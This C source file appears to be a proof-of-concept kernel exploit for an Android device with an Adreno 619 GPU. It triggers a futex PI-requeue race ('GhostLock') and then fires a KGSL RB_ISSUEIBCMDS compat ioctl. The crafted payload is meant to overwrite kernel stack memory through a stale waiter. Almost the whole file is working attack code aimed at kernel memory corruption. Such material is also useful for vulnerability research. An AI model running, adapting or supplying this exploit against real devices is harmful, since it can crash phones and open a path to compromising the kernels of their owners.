/**
 * ghostlock32_final.c — Full GhostLock + KGSL stack overwrite test
 *
 * Uses correct KGSL context flags (0x12 = PREAMBLE | NO_GMEM_ALLOC).
 * With valid context, RB_ISSUEIBCMDS ioctl WILL reach CFU path.
 *
 * WARNING: This test may CRASH the kernel if stack overwrite works!
 * Monitor: adb shell dmesg | tail -30 (if still alive after)
 *
 * Compile: armv7a-linux-androideabi33-clang -static -O2 -pthread -o g32_final ghostlock32_final.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <time.h>
#include <stdint.h>

/* ── KGSL ioctl ──────────────────────────────────────────────────── */
#define KGSL_DEVICE "/dev/kgsl-3d0"
#define KGSL_IOC(nr, sz) \
    (((uint32_t)3 << 30) | (((uint32_t)(sz)) << 16) | (((uint32_t)0x09) << 8) | ((uint32_t)(nr)))

/* Compat command codes from kgsl_compat_ioctl_funcs table */
#define SETPROPERTY_COMPAT     0xc00c0902  /* [0x02] sz=12 */
#define DRAWCTXT_CREATE        0xc0080913  /* [0x13] sz=8  */
#define DRAWCTXT_DESTROY       0x40040914  /* [0x14] sz=4  */
#define RB_ISSUEIBCMDS_COMPAT  0xc0140910  /* [0x10] sz=20 */

/* ── KGSL context flags ──────────────────────────────────────────── */
#define KGSL_CONTEXT_PREAMBLE       0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC  0x00000002
#define KGSL_CONTEXT_SAVE_GMEM      0x00000001
#define CREATE_FLAGS (KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC)  /* 0x12 */

/* ── GhostLock futex ─────────────────────────────────────────────── */
static uint32_t f_wait       __attribute__((aligned(4096)));
static uint32_t f_pi_target  __attribute__((aligned(4096)));
static uint32_t f_pi_chain   __attribute__((aligned(4096)));
static volatile int waiter_ready, owner_started, route_done, kgsl_ok;

static inline long futex_op(uint32_t *uaddr, int op, uint32_t val,
                             const struct timespec *timeout,
                             uint32_t *uaddr2, uint32_t val3) {
    return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/* ── KGSL device properties setup ────────────────────────────────── */
static void kgsl_setup_properties(int fd) {
    struct { uint32_t type; uint32_t value_ptr; uint32_t sizebytes; } sp = {0};
    char val[256] = {0};
    uint32_t props[] = {0x6, 0x7, 0x13, 0x18, 0x1A, 0x1B, 0x20, 0x25};
    for (int i = 0; i < sizeof(props)/sizeof(props[0]); i++) {
        memset(val, 0, sizeof(val));
        sp.type = props[i]; sp.value_ptr = (uint32_t)(uintptr_t)val; sp.sizebytes = sizeof(val);
        ioctl(fd, SETPROPERTY_COMPAT, &sp);
    }
}

/* ── Waiter thread ───────────────────────────────────────────────── */
static void *waiter_thread(void *arg) {
    (void)arg;
    printf("[waiter] locking pi_chain...\n");
    long r = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[waiter] pi_chain locked, ret=%ld errno=%d\n", r, errno);

    struct timespec timeout;
    clock_gettime(CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += 10;

    waiter_ready = 1;
    while (!owner_started) usleep(1000);

    printf("[waiter] entering FUTEX_WAIT_REQUEUE_PI...\n");
    r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI returned: %ld errno=%d\n\n", r, errno);

    /* ── KGSL: open, init, create context, fire ioctl ──────────── */
    int fd = open(KGSL_DEVICE, O_RDWR);
    if (fd < 0) { printf("[kgsl] FAIL: open errno=%d\n", errno); goto out; }
    printf("[kgsl] %s opened (fd=%d)\n", KGSL_DEVICE, fd);

    /* Setup device properties */
    kgsl_setup_properties(fd);
    printf("[kgsl] device properties configured\n");

    /* Create GPU context with correct flags */
    struct { uint32_t flags; uint32_t id; } c = {CREATE_FLAGS, 0};
    r = ioctl(fd, DRAWCTXT_CREATE, &c);
    printf("[kgsl] DRAWCTXT_CREATE(flags=0x%08x): ret=%d id=%u errno=%d\n",
           CREATE_FLAGS, r, c.id, errno);

    if (r < 0) {
        printf("[kgsl] FAIL: context creation failed\n");
        close(fd);
        goto out;
    }
    printf("[kgsl] ✅ GPU context created! id=%u\n", c.id);
    kgsl_ok = 1;

    /* Build ibdesc — the 16-byte CFU payload targeting stale waiter */
    struct { uint64_t gpuaddr; uint64_t sizedwords; } ibdesc = {
        .gpuaddr    = 0x0,                          /* → pi_tree.left (set to NULL) */
        .sizedwords = 0x4141414141414141ULL,         /* → TASK pointer (crash pattern) */
    };

    /* Build issueibcmds compat struct (20 bytes) */
    struct {
        uint32_t drawctxt_id;
        uint32_t flags;
        uint32_t ibdesc_addr;
        uint32_t timestamp;
        uint32_t numibs;
    } cmd = {
        .drawctxt_id = c.id,
        .flags       = 0,
        .ibdesc_addr = (uint32_t)(uintptr_t)&ibdesc,
        .timestamp   = 0,
        .numibs      = 1,
    };

    printf("[kgsl] Firing RB_ISSUEIBCMDS (ctx=%u):\n", c.id);
    printf("[kgsl]   ibdesc: gpuaddr=0x%016llx sizedwords=0x%016llx\n",
           (unsigned long long)ibdesc.gpuaddr,
           (unsigned long long)ibdesc.sizedwords);
    printf("[kgsl]   cmd: ibdesc@0x%08x numibs=%u\n", cmd.ibdesc_addr, cmd.numibs);
    printf("[kgsl] ⚠️  CFU will overwrite stack — kernel may crash NOW!\n");

    int ioctl_ret = ioctl(fd, RB_ISSUEIBCMDS_COMPAT, &cmd);
    printf("[kgsl] RB_ISSUEIBCMDS: ret=%d errno=%d (%s)\n",
           ioctl_ret, errno, ioctl_ret < 0 ? strerror(errno) : "OK");
    printf("[kgsl] ⚠️  If you see this message, kernel did NOT crash (CFU may not have fired)\n");

    /* Cleanup */
    ioctl(fd, DRAWCTXT_DESTROY, &c.id);
    close(fd);

out:
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    route_done = 1;
    return NULL;
}

/* ── Owner thread ────────────────────────────────────────────────── */
static void *owner_thread(void *arg) {
    (void)arg;
    printf("[owner] locking pi_target...\n");
    long r = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[owner] pi_target locked, ret=%ld errno=%d\n", r, errno);
    owner_started = 1;

    while (!waiter_ready) usleep(1000);
    usleep(500000);

    printf("[owner] locking pi_chain (creates PI chain)...\n");
    r = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[owner] pi_chain locked, ret=%ld errno=%d\n", r, errno);

    while (!route_done) sleep(1);
    return NULL;
}

/* ── Main ────────────────────────────────────────────────────────── */
int main(void) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║  GhostLock + KGSL Stack Overwrite — FINAL TEST  ║\n");
    printf("║  Device: Onyx Leaf5 (Adreno 619)                ║\n");
    printf("║  ⚠️  THIS MAY CRASH THE KERNEL!                 ║\n");
    printf("╚══════════════════════════════════════════════════╝\n\n");

    f_wait = 0;
    f_pi_target = 0;
    f_pi_chain = 0;

    /* Run threads */
    pthread_t waiter, owner;
    pthread_create(&waiter, NULL, waiter_thread, NULL);
    usleep(200000);
    pthread_create(&owner,  NULL, owner_thread,  NULL);
    usleep(300000);

    /* ── GhostLock trigger ── */
    printf("[trigger] GhostLock: FUTEX_CMP_REQUEUE_PI (f_wait=0x%08x)...\n", f_wait);

    int triggered = 0;
    for (int attempt = 0; attempt < 100; attempt++) {
        long ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                            (void *)(uintptr_t)1, &f_pi_target, 0);
        if (ret >= 0) {
            printf("[trigger] ✅ GhostLock triggered! attempt=%d ret=%ld\n", attempt, ret);
            triggered = 1;
            break;
        }
        usleep(1000);
    }
    if (!triggered) {
        printf("[trigger] ❌ GhostLock trigger failed\n");
    }

    /* Wait */
    for (int i = 0; i < 15 && !route_done; i++) sleep(1);

    printf("\n=== Test Complete ===\n");
    printf("  GhostLock triggered: %s\n", triggered ? "YES" : "NO");
    printf("  KGSL context created: %s\n", kgsl_ok ? "YES" : "NO");
    printf("  Route done: %s\n", route_done ? "YES" : "NO");
    if (triggered && kgsl_ok) {
        printf("  ⚠️  Check dmesg:");
        printf(" adb shell dmesg | tail -50\n");
    }

    pthread_join(waiter, NULL);
    pthread_join(owner, NULL);
    return 0;
}
